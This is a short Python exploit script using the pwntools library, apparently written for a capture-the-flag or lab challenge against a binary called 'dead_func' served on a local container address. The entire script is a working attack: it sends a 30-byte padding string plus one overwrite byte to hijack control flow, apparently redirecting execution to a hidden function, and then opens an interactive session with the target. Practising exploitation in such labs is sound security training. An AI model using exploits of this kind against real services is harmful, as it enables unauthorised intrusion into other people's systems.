from pwn import *

p = remote('172.17.0.2', 4322)
#p = process('./dead_func')
payload = 'A'*30 + '\xd8'

p.send(payload + '\n')
p.interactive()
